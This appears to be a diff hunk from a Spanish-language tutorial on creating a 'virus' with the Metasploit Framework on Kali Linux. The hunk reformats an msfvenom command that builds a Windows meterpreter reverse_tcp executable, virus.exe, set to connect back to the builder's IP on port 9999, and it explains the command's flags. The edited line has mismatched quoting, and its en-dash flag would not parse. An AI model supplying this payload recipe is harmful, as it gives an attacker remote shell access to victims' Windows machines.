@@ -10,8 +10,7 @@ En este tutorial, aprenderás cómo crear un virus usando el Metasploit Framewor
 
 Para comenzar, necesitas abrir una terminal en Kali Linux y ejecutar el siguiente comando:
 
-```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=[tu IP] LPORT=9999 -a x86 –platform windows -o /root/Desktop/virus.exe -f exe
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[tu IP] LPORT=9999 -a x86 –platform windows -o /root/Desktop/virus.exe -f exe'
 '-p': Especifica el payload a utilizar.
 '-a': Define la arquitectura que utilizará el virus.
 '--platform': Determina la plataforma en la que actuará el virus.
